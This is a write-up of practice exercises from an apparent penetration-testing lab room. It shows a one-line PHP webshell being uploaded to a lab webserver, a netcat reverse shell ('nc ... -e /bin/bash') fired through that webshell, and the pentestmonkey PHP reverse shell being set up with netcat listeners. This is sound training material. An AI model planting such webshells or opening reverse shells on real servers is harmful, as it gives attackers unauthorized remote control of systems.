# Practice and Examples

## Linux machine
Configured with a simple webserver where files can be uploaded.

![Linux webserver](./img/linux_machine_webserver.png "linux webserver")

### Exercise 1. 
Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.

We upload a simple PHP webshell: 

```php
# webshell.php

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

We can check that it works by accessing the file on the server at `<SERVER_IP>/uploads/webshell.php?cmd=whoami`.

![Webshell success](./img/webshell_whoami.png "Webshell success")

On the attacking machine, we set up a listener at port 6000:

```console
~$ nc -lnvp 6000
```

and we send a reverse shell back to the listener by accessing `http://<SERVER_IP>/uploads/webshell.php?cmd=nc%2010.10.188.168%206000%20-e%20/bin/bash`. i.e. we send the command `nc <LISTENER_IP> <PORT> -e /bin/bash` as the `GET` parameter.

![Reverse shell success](./img/reverse_shell_success.png "Reverse shell success")

### Exercise 2. 
Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.

We edit the reverse shell script found in `/usr/share/webshells`, changing the IP address and the port.

![Edit Pentestmonkey script](./img/pentestmonkey_php_shell.png "Edit Pentestmonkey script")

We then upload this file onto the server. We set up a Netcat listener at the designated port:

```console
~$ nc -lnvp 1234
```
Then, we activate the shell by accessing the file at `<SERVER_IP>/uploads/php-reverse-shell.php`.

### Exercise 3.

Log into the Linux machine over SSH using the credentials given. Use the techniques in [Common Shell Payloads](./what_the_shell.md#common-shell-payloads) to experiment with bind and reverse netcat shells.

See linked section for details.

### Exercise 4.

Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

See [Socat](./what_the_shell.md#socat) for details.